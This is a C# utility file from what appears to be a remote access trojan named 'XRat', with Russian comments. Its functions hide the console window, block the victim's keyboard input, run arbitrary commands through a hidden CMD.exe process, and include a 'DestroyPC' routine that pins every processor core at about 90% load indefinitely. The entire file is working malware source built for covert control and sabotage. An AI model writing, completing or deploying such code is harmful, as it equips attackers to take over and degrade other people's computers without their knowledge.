using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace XRat
{
    public static class Utils
    {
        // Подключаем необходимые Windows API
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0; // Скрыть окно
        const int SW_SHOW = 5; // Показать окно

        [DllImport("user32.dll")]
        private static extern int BlockInput(int fBlockIt);

        public static void BlockKeyboard()
        {
            // Блокируем клавиатуру
            BlockInput(1);
        }

        public static void UnblockKeyboard()
        {
            // Разблокируем клавиатуру
            BlockInput(0);
        }

        public static bool CMD(string command)
        {
            // Start the CMD process with /min flag to run it minimized
            var processStartInfo = new ProcessStartInfo
            {
                FileName = "CMD.exe",
                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
                RedirectStandardOutput = true, // Optionally capture output
                RedirectStandardError = true,  // Optionally capture errors
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(processStartInfo))
                {
                    if (process == null)
                    {
                        throw new InvalidOperationException("Failed to start CMD.exe process.");
                    }

                    // Wait for the process to exit
                    process.WaitForExit();
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool Hide()
        {
            // Получаем дескриптор консольного окна
            IntPtr hConsole = GetConsoleWindow();

            try
            {
                // Скрываем консольное окно
                ShowWindow(hConsole, SW_HIDE);
            }
            catch { return false; }

            return true;
        }

        public static bool Show()
        {
            // Получаем дескриптор консольного окна
            IntPtr hConsole = GetConsoleWindow();

            try
            {
                // Вернуть окно обратно:
                ShowWindow(hConsole, SW_SHOW);
            }
            catch { return false; }

            return true;
        }

        public static void DestroyPC()
        {
            int numberOfThreads = Environment.ProcessorCount; // Получаем количество логических процессоров
            int targetLoad = 90; // Целевая нагрузка - 90%

            // Вычисляем, сколько процентов времени процессор должен быть занят
            int workTime = 100; // Время работы в миллисекундах
            int idleTime = (100 - targetLoad); // Время бездействия

            // Запускаем несколько потоков
            for (int i = 0; i < numberOfThreads; i++)
            {
                Thread t = new Thread(() =>
                {
                    while (true)
                    {
                        // Нагружаем процессор на заданный процент
                        var sw = Stopwatch.StartNew();
                        while (sw.ElapsedMilliseconds < workTime)
                        {
                            // Сложные вычисления для загрузки процессора
                            Math.Sqrt(new Random().NextDouble()); // Математическая операция для нагрузки
                        }
                        // Отдыхаем, чтобы не создать 100% нагрузку
                        Thread.Sleep(idleTime);
                    }
                });
                t.IsBackground = true; // Потоки будут завершаться при завершении программы
                t.Start();
            }
        }
    }
}
